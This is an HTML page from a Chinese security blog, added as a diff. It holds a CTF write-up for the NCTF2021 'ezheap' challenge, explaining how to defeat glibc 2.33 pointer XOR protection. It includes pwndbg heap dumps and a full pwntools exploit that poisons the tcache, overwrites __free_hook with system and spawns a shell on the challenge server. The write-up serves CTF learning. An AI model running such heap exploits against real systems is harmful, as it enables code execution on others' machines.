@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+
+
+<html lang="zh">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>2.33版本下的堆地址任意申请 |  H.greed</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="https://user-images.githubusercontent.com/72968793/136398013-abf88785-b056-4f51-aa15-a8ee261f5c7f.jpg" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
+      />
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-2-33版本下的堆地址任意申请"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  2.33版本下的堆地址任意申请
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/11/28/2-33%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84%E5%A0%86%E5%9C%B0%E5%9D%80%E4%BB%BB%E6%84%8F%E7%94%B3%E8%AF%B7/" class="article-date">
+  <time datetime="2021-11-28T13:34:51.000Z" itemprop="datePublished">2021-11-28</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">1.4k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">6 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天（2021.11.28）NCTF的题目让我大开眼界，上来最低利用版本都是2.31，新生都如此生猛了吗，由于我比较菜只搞定了这个ezheap，2.33版本的题目我也是第一次做，花了1个小时fuzz出了这个玩意是异或加密然后又花了30多分钟去理顺逻辑，算是收获满满吧</p>
+<p>由于这个2.33的利用我在网上并没有看见有文章发布，我就写一下供各位pwn学习参考。</p>
+<span id="more"></span>
+
+<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>UAF，异或加密，hook利用</p>
+<h1 id="版本新增保护介绍"><a href="#版本新增保护介绍" class="headerlink" title="版本新增保护介绍"></a>版本新增保护介绍</h1><p>2.33版本的glibc不同于以往，对于堆块地址的释放之后，对于同一大小的fastbin以及tcache有效的fd永远只有一个，剩余的bin照旧。</p>
+<p>对于2.33版本下对于fastbin以及tcache的fd指针会被进行异或操作加密，用来异或的值随堆地址发生改变。</p>
+<h1 id="举例利用"><a href="#举例利用" class="headerlink" title="举例利用"></a>举例利用</h1><h2 id="例题：NCTF2021-ezheap"><a href="#例题：NCTF2021-ezheap" class="headerlink" title="例题：NCTF2021 ezheap"></a>例题：NCTF2021 ezheap</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>如下存在UAF漏洞，对于heap的size位置零，但是指针未置零，可以造成堆复用</p>
+<p>tips：可以利用glibc-all-in-one配合patchelf来建立题目的运行环境</p>
+<p>命令如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ./glibc-all-in-one/libs/2.33-0ubuntu5_amd64/ld-2.33.so --set-rpath ./glibc-all-in-one/libs/2.33-0ubuntu5_amd64 ezheap</span><br></pre></td></tr></table></figure>
+
+<p>再说点骚操作，题目一般只给libc没有ld，可以直接把all in one的libc替换成题目给的，然后再去patchelf就可以使用上题目的libc了</p>
+<p><img src="https://user-images.githubusercontent.com/72968793/143770940-500cd844-72ba-4db8-a917-b5fdb682533b.png" alt="image"></p>
+<h3 id="低于2-33常规思路攻击"><a href="#低于2-33常规思路攻击" class="headerlink" title="低于2.33常规思路攻击"></a>低于2.33常规思路攻击</h3><p>通常的思路就是先free一次但是heaparry指针保留，再申请回来就有一个新的指针指向同一个地址，直接uaf任意地址申请，attack free hook 梭哈getshell</p>
+<h3 id="2-33绕过方法"><a href="#2-33绕过方法" class="headerlink" title="2.33绕过方法"></a>2.33绕过方法</h3><h5 id="First-堆地址的泄露"><a href="#First-堆地址的泄露" class="headerlink" title="First 堆地址的泄露"></a>First 堆地址的泄露</h5><p>首先申请两个chunk，然后直接free掉，此时这两个堆的fd位置的内容如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5569374d8290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x5569374d82a0</span>:	<span class="number">0x00000005569374d8</span>	<span class="number">0x00005569374d8010</span></span><br><span class="line"><span class="number">0x5569374d82b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5569374d82c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5569374d82d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5569374d82e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5569374d82f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5569374d8300</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5569374d8310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5569374d8320</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x5569374d8330</span>:	<span class="number">0x0000556c61def678</span>	<span class="number">0x00005569374d8010</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>由于UAF漏洞的存在，直接泄露出chunk0和chunk1的fd，然后进行异或操作我们可以得到 heap:0x5569374d82a0</p>
+<p>也就是此时chunk0的content addr，这个地址我们先记录下来</p>
+<p>（由于我脚本是分多次启动打断点调试，数据不是同一批，具体可以自己去用脚本去调试）</p>
+<h5 id="Second-获取某个堆块的对应的异或key值"><a href="#Second-获取某个堆块的对应的异或key值" class="headerlink" title="Second 获取某个堆块的对应的异或key值"></a>Second 获取某个堆块的对应的异或key值</h5><p>我们继续进行，假设我们已经填充好了tcache并且释放了一个chunk进入了unsortedbin，目前的heap如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5650e8eb5000</span></span><br><span class="line">Size: <span class="number">0x291</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5650e8eb5290</span></span><br><span class="line">Size: <span class="number">0x91</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5650e8eb5320</span></span><br><span class="line">Size: <span class="number">0x91</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5650e8eb53b0</span></span><br><span class="line">Size: <span class="number">0x91</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5650e8eb5440</span></span><br><span class="line">Size: <span class="number">0x91</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5650e8eb54d0</span></span><br><span class="line">Size: <span class="number">0x91</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x5650e8eb5560</span></span><br><span class="line">Size: <span class="number">0x91</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(tcache)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x5650e8eb55f0</span></span><br><span class="line"><span class="function">Size: 0x91</span></span><br><span class="line"><span class="function">fd: 0x56558de5dbc5</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x5650e8eb5680</span></span><br><span class="line"><span class="function">Size: 0x91</span></span><br><span class="line"><span class="function">fd: 0x7f95da868c00</span></span><br><span class="line"><span class="function">bk: 0x7f95da868c00</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk</span></span><br><span class="line"><span class="function">Addr: 0x5650e8eb5710</span></span><br><span class="line"><span class="function">Size: 0x90</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Top chunk | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x5650e8eb57a0</span></span><br><span class="line"><span class="function">Size: 0x20861</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>
+
+<p>bin状态如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x5650e8eb5600</span> ◂— <span class="number">0x56558de5dbc5</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x5650e8eb5680</span> —▸ <span class="number">0x7f95da868c00</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x5650e8eb5680</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>此时用第一步方法得到的堆地址是  0x5650e8eb52a0</p>
+<p>然后为了形成堆复用，我们会再去add一个0x90的chunk，此时的heaparry如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x40a0</span>+<span class="number">0x5650e8348000</span></span><br><span class="line"><span class="number">0x5650e834c0a0</span>:	<span class="number">0x00005650e8eb52a0</span>	<span class="number">0x00005650e8eb5330</span></span><br><span class="line"><span class="number">0x5650e834c0b0</span>:	<span class="number">0x00005650e8eb53c0</span>	<span class="number">0x00005650e8eb5450</span></span><br><span class="line"><span class="number">0x5650e834c0c0</span>:	<span class="number">0x00005650e8eb54e0</span>	<span class="number">0x00005650e8eb5570</span></span><br><span class="line"><span class="number">0x5650e834c0d0</span>:	<span class="number">0x00005650e8eb5600</span>	<span class="number">0x00005650e8eb5690</span></span><br><span class="line"><span class="number">0x5650e834c0e0</span>:	<span class="number">0x00005650e8eb5720</span>	<span class="number">0x00005650e8eb5600</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接着我们可以看下当前的bin情况如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">6</span>]: <span class="number">0x5650e8eb5570</span> ◂— <span class="number">0x56558de5da55</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们刚才泄露的地址是 0x5650e8eb52a0 现在tc最新的地址是 0x5650e8eb5570</p>
+<p>我们现在可以得到key值就是key=0x5650e8eb5570^0x5650e8eb52a0=0x5650e8f25</p>
+<p>上面我也提到了这个key是变化的，因此我们还要爆破下，但是爆破是可以找到范围的，我们可以利用常规的错误打法</p>
+<p>先看看泄露的key和需要的key的一个偏移（很好玩的是这个偏移也是随机的）</p>
+<p>我们再来一次之前的操作然后得到的最新的泄露key是0x5612a9a54</p>
+<p>我们看看错误的bin如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">bin</span></span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">6</span>]: <span class="number">0x7f8b1b63e5e4</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>正确的free hook地址：0x7f8e7a497e20</p>
+<p>libc_key=0x7f8e7a497e20^0x7f8b1b63e5e4=0x5612a9bc4</p>
+<p>hex(0x5612a9bc4-0x5612a9a54)=0x170</p>
+<p>我试了很多次的调试，libc_key有0x170，-0x170，0x190，-0x190当然实际情况实际调试，只要调试出来的值就是有可能的偏移</p>
+<p>最后把free_hook^libc_key=encrypto_free_hook 然后常规套路直接getshell</p>
+<p><img src="https://user-images.githubusercontent.com/72968793/143772509-27b6e763-998e-45ba-acdd-fc0e1bed8b32.png" alt="image"></p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=process(<span class="string">&#x27;./ezheap&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;129.211.173.64&#x27;,10002)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc-2.33.so&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,con</span>):</span></span><br><span class="line">	r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Content: &quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,con</span>):</span></span><br><span class="line">	r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">	r.sendafter(<span class="string">&quot;Content: &quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">	r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">	r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">flag=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> flag:</span><br><span class="line">	<span class="comment">#r=process(&#x27;./ezheap&#x27;)</span></span><br><span class="line">	r=remote(<span class="string">&#x27;129.211.173.64&#x27;</span>,<span class="number">10002</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">		add(<span class="number">128</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	dele(<span class="number">0</span>)</span><br><span class="line">	show(<span class="number">0</span>)</span><br><span class="line">	he0=u64(r.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(he0))</span><br><span class="line">	dele(<span class="number">1</span>)</span><br><span class="line">	show(<span class="number">1</span>)</span><br><span class="line">	he1=u64(r.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(he1))</span><br><span class="line">	heap=he0^he1</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line">	<span class="comment">#gdb.attach(r)</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">8</span>):</span><br><span class="line">		dele(i)</span><br><span class="line">	show(<span class="number">5</span>)</span><br><span class="line">	he=u64(r.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(he))</span><br><span class="line">	show(<span class="number">6</span>)</span><br><span class="line">	he6=u64(r.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(he6))</span><br><span class="line">	show(<span class="number">7</span>)</span><br><span class="line">	base=u64(r.recv(<span class="number">6</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)-<span class="number">0x1e0c00</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">	<span class="comment">#gdb.attach(r)</span></span><br><span class="line">	free_hook=base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(free_hook))</span><br><span class="line">	sys=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">	add(<span class="number">128</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	tagerheap=heap+<span class="number">0x2d0</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;target heap:&quot;</span>+<span class="built_in">hex</span>(tagerheap))</span><br><span class="line">	tagerheap_key=tagerheap^he</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;target heap_key:&quot;</span>+<span class="built_in">hex</span>(tagerheap_key))</span><br><span class="line">	libc_key=tagerheap_key+<span class="number">0x170</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;target libc_key:&quot;</span>+<span class="built_in">hex</span>(libc_key))</span><br><span class="line">	<span class="comment">#gdb.attach(r)</span></span><br><span class="line">	dele(<span class="number">6</span>)</span><br><span class="line">	edit(<span class="number">9</span>,p64(free_hook^libc_key)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">	add(<span class="number">128</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">	add(<span class="number">128</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	edit(<span class="number">11</span>,p64(sys)+<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">	<span class="comment">#gdb.attach(r)</span></span><br><span class="line">	dele(<span class="number">6</span>)</span><br><span class="line">	r.sendline(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">	a=r.recv()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&#x27;bin&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">		r.interactive()</span><br><span class="line">		<span class="built_in">print</span>(a)</span><br><span class="line">		flag=<span class="number">0</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		r.close()</span><br></pre></td></tr></table></figure>
+
+<h2 id="题目附件下载链接"><a href="#题目附件下载链接" class="headerlink" title="题目附件下载链接"></a>题目附件下载链接</h2><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1YKqJOuGZrueLCkKxFwu2bA">https://pan.baidu.com/s/1YKqJOuGZrueLCkKxFwu2bA</a><br>提取码：urk1</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://hgreed.vip/2021/11/28/2-33%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84%E5%A0%86%E5%9C%B0%E5%9D%80%E4%BB%BB%E6%84%8F%E7%94%B3%E8%AF%B7/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2-33/" rel="tag">2.33</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2021/12/07/%E6%B9%96%E6%B9%98%E6%9D%AF2021%E7%BA%BF%E4%B8%8Bpwn/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            湖湘杯2021线下pwn
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2021/11/21/srop%E5%A4%8D%E4%B9%A0/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">srop复习</div>
+      </a>
+    
+  </nav>
+
+  
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2015-2021
+        <i class="ri-heart-fill heart_icon"></i> H.greed
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="https://user-images.githubusercontent.com/72968793/136398013-abf88785-b056-4f51-aa15-a8ee261f5c7f.jpg" alt="H.greed"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://jue-xian.gitee.io/">老博客1</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" target="_blank" rel="noopener" href="https://jue-xian.gitee.io/diazang">老博客2</a>
+    </li>
+    
+    <li class="nav-item">
